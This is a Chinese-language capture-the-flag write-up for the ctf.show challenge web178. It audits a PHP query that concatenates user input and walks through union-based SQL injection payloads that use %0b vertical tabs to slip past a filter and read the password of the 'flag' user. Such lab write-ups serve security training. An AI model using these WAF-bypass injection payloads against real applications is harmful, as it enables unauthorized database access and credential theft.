### 📝 题目信息

- **题目名称**：web178
- **题目序号**：8/150
- **题目提示**：使用sqlmap是没有灵魂的
- **题目链接**：https://e3f011e1-d47d-4f37-b31e-fe0b76ef6da6.challenge.ctf.show/

### 🔍 源码审计

**查询语句：**

```php
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

**过滤函数：**

```php
function waf($str){
   //代码过于简单，不宜展示
}
```

### 🧪 注入过程

#### 第1步：测试web177的payload

```bash
999'union/**/select/**/'1',2,'3';%23
```

**结果：** ❌ 无数据返回
**结论：** `/**/` 注释符被过滤了

#### 第2步：测试垂直制表符%0b

```bash
999'union%0bselect%0b'1',2,'3';%23
```

**结果：** ✅ **有数据返回**

| ID   | 用户名 | 密码 |
| :--- | :----- | :--- |
| 1    | 2      | 3    |

**结论：** `%0b`（垂直制表符）可以代替空格，且能绕过WAF

#### 第3步：构造子查询获取flag

```bash
999'union%0bselect'1',
(select`password`from`ctfshow_user`where`username`='flag'),
'3
```

### 🏁 最终结果

**成功获取flag：**

```bash
ctfshow{bb69606d-150b-456b-8f19-a9d8bfe6f443}
```

**最终payload：**

```sql
999'union%0bselect'1',
(select`password`from`ctfshow_user`where`username`='flag'),
'3
```

### 📊 WAF规则分析

| 测试payload         | 结果     | 结论             |
| :------------------ | :------- | :--------------- |
| `/**/`              | ❌ 无数据 | 注释符被过滤     |
| `%0b`（垂直制表符） | ✅ 有数据 | 可以用来代替空格 |

### 💡 知识点总结

| 知识点         | 说明                            |
| :------------- | :------------------------------ |
| **垂直制表符** | `%0b`，URL编码后的特殊空白字符  |
| **反引号用法** | MySQL中用反引号包裹表名、字段名 |
| **子查询**     | 在union中嵌套select获取flag数据 |